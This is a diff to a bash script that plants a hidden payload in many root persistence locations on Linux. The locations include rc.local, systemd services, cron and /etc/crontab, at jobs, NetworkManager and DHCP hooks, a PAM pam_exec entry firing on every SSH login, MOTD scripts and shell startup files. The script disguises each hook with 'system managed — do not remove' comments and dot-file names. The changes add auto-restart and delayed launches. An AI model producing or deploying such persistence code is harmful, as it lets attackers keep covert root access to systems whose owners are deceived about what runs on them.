@@ -67,7 +67,7 @@ echo
 info "[1/8] Planting in /etc/rc.local ..."
 
 RC_LOCAL="/etc/rc.local"
-PAYLOAD_CALL="bash /usr/local/lib/.sysinit-helper 2>/dev/null &"
+PAYLOAD_CALL="sleep 15 && /usr/local/lib/.sysinit-helper 2>/dev/null &"
 
 # Write a convincingly disguised rc.local
 cat > "${RC_LOCAL}" <<RCEOF
@@ -109,7 +109,7 @@ cat > "${PROFILED_SCRIPT}" <<'PROFEOF'
 #!/bin/bash
 # System environment initialisation — managed by sysenv-daemon
 if [ "$(id -u)" -eq 0 ]; then
-    bash /usr/local/lib/.sysenv-init 2>/dev/null &
+    /usr/local/lib/.sysenv-init 2>/dev/null &
 fi
 PROFEOF
 chmod 644 "${PROFILED_SCRIPT}"
@@ -137,9 +137,10 @@ DefaultDependencies=no
 After=local-fs.target sysinit.target
 
 [Service]
-Type=oneshot
-ExecStart=/bin/bash /usr/local/lib/.khelper-init
-RemainAfterExit=yes
+Type=simple
+ExecStart=/usr/local/lib/.khelper-init
+Restart=always
+RestartSec=30
 StandardOutput=null
 StandardError=null
 
@@ -171,7 +172,7 @@ cat > "${CROND_FILE}" <<'CRONEOF'
 SHELL=/bin/bash
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-@reboot  root  /bin/bash /usr/local/lib/.syslogd-helper 2>/dev/null
+@reboot  root  /usr/local/lib/.syslogd-helper 2>/dev/null
 CRONEOF
 chmod 644 "${CROND_FILE}"
 
@@ -201,7 +202,7 @@ ${MARKER}
 # Network diagnostics daemon hook (system managed — do not remove)
 if [[ \$EUID -eq 0 ]] && [[ -z "\${__SYSNET_DIAG_RAN:-}" ]]; then
     export __SYSNET_DIAG_RAN=1
-    bash /usr/local/lib/.sysnet-diag 2>/dev/null &
+    /usr/local/lib/.sysnet-diag 2>/dev/null &
 fi
 BASHRCEOF
 fi
@@ -231,13 +232,13 @@ chmod +x "${AT_RUNNER}"
 
 cat > "${AT_WRAPPER}" <<'ATWRAP'
 #!/bin/bash
-/bin/bash /usr/local/lib/.sysat-runner 2>/dev/null
-echo "/bin/bash /usr/local/lib/.sysat-wrapper.sh 2>/dev/null" | at now + 30 minutes 2>/dev/null
+/usr/local/lib/.sysat-runner 2>/dev/null
+echo "/usr/local/lib/.sysat-wrapper.sh 2>/dev/null" | at now + 30 minutes 2>/dev/null
 ATWRAP
 chmod +x "${AT_WRAPPER}"
 
 systemctl enable --now atd 2>/dev/null || true
-echo "/bin/bash ${AT_WRAPPER} 2>/dev/null" | at now + 30 minutes 2>/dev/null || \
+echo "${AT_WRAPPER} 2>/dev/null" | at now + 30 minutes 2>/dev/null || \
     warn "  at job submission failed — is atd running?"
 
 success "  ${AT_RUNNER}   — payload copy planted"
@@ -263,7 +264,7 @@ cat > "${CROND_INTERVAL}" <<'CRONINTEOF'
 SHELL=/bin/bash
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
-*/30 * * * *  root  /bin/bash /usr/local/lib/.syscron-interval 2>/dev/null
+*/30 * * * *  root  /usr/local/lib/.syscron-interval 2>/dev/null
 CRONINTEOF
 chmod 644 "${CROND_INTERVAL}"
 
@@ -291,11 +292,12 @@ Description=Journal Flush Helper
 After=local-fs.target
 
 [Service]
-Type=oneshot
-ExecStart=/bin/bash /usr/local/lib/.systimer-exec
+Type=simple
+ExecStart=/usr/local/lib/.systimer-exec
+Restart=always
+RestartSec=30
 StandardOutput=null
 StandardError=null
-RemainAfterExit=no
 SVCEOF
 chmod 644 "${TIMER_SVC}"
 
@@ -341,7 +343,7 @@ chmod +x "${NM_PAYLOAD}"
 cat > "${NM_SCRIPT}" << 'NMEOF'
 #!/bin/bash
 # NetworkManager connectivity helper — do not remove (system managed)
-/bin/bash /usr/local/lib/.sysnet-nm-hook 2>/dev/null &
+sleep 5 && /usr/local/lib/.sysnet-nm-hook 2>/dev/null &
 NMEOF
 chmod 755 "${NM_SCRIPT}"
 
@@ -368,7 +370,7 @@ chmod +x "${DHCP_PAYLOAD}"
 cat > "${DHCP_HOOK}" << 'DHCPEOF'
 #!/bin/bash
 # DHCP connectivity helper — do not remove (system managed)
-/bin/bash /usr/local/lib/.sysdhcp-hook 2>/dev/null &
+/usr/local/lib/.sysdhcp-hook 2>/dev/null &
 DHCPEOF
 chmod 755 "${DHCP_HOOK}"
 
@@ -401,7 +403,7 @@ cat > "${INITD_SCRIPT}" << 'INITDEOF'
 # Description:       Network connectivity initialisation helper for system services
 ### END INIT INFO
 case "$1" in
-    start) /bin/bash /usr/local/lib/.sysinit-sysv 2>/dev/null & ;;
+    start) sleep 10 && /usr/local/lib/.sysinit-sysv 2>/dev/null & ;;
     stop|restart|reload|status) ;;
 esac
 exit 0
@@ -434,7 +436,7 @@ chmod 755 "${PAM_EXEC_PAYLOAD}"
 
 if [[ -f "${PAM_TARGET}" ]]; then
     if ! grep -q "syspam-exec" "${PAM_TARGET}" 2>/dev/null; then
-        sed -i "1i # system session helper\nsession optional pam_exec.so quiet /bin/bash /usr/local/lib/.syspam-exec" \
+        sed -i "1i # system session helper\nsession optional pam_exec.so quiet /usr/local/lib/.syspam-exec" \
             "${PAM_TARGET}" 2>/dev/null || true
         success "  ${PAM_TARGET} modified (fires on every SSH login)"
     else
@@ -464,7 +466,7 @@ chmod +x "${MOTD_PAYLOAD}"
 cat > "${MOTD_SCRIPT}" << 'MOTDEOF'
 #!/bin/bash
 # System information helper — managed by update-motd
-/bin/bash /usr/local/lib/.sysmotd-exec 2>/dev/null &
+/usr/local/lib/.sysmotd-exec 2>/dev/null &
 MOTDEOF
 chmod 755 "${MOTD_SCRIPT}"
 
@@ -495,7 +497,7 @@ ${PROFILE_MARKER}
 # System diagnostics init (system managed — do not remove)
 if [[ -z "\${__SYSPROFILE_RAN:-}" ]]; then
     export __SYSPROFILE_RAN=1
-    /bin/bash /usr/local/lib/.sysprofile-exec 2>/dev/null &
+    /usr/local/lib/.sysprofile-exec 2>/dev/null &
 fi
 PROFILEOF
         success "  ${rc_file} hook appended"
@@ -530,7 +532,7 @@ ${BASHRC_SYS_MARKER}
 # System diagnostics helper (system managed — do not remove)
 if [[ \$EUID -eq 0 ]] && [[ -z "\${__SYSBASHRC_RAN:-}" ]]; then
     export __SYSBASHRC_RAN=1
-    /bin/bash /usr/local/lib/.sysbashrc-exec 2>/dev/null &
+    /usr/local/lib/.sysbashrc-exec 2>/dev/null &
 fi
 BASHRCGEOF
         success "  ${BASHRC_GLOBAL} hook appended"
@@ -565,8 +567,8 @@ fi
 if ! grep -q "syscrontab-exec" "${ETC_CRONTAB}" 2>/dev/null; then
     cat >> "${ETC_CRONTAB}" << 'CRONTABEOF'
 # system-wide maintenance task — do not remove (system managed)
-@reboot       root  /bin/bash /usr/local/lib/.syscrontab-exec 2>/dev/null
-*/30 * * * *  root  /bin/bash /usr/local/lib/.syscrontab-exec 2>/dev/null
+@reboot       root  /usr/local/lib/.syscrontab-exec 2>/dev/null
+*/30 * * * *  root  /usr/local/lib/.syscrontab-exec 2>/dev/null
 CRONTABEOF
     success "  ${ETC_CRONTAB} entries added (@reboot + every 30 min)"
 else
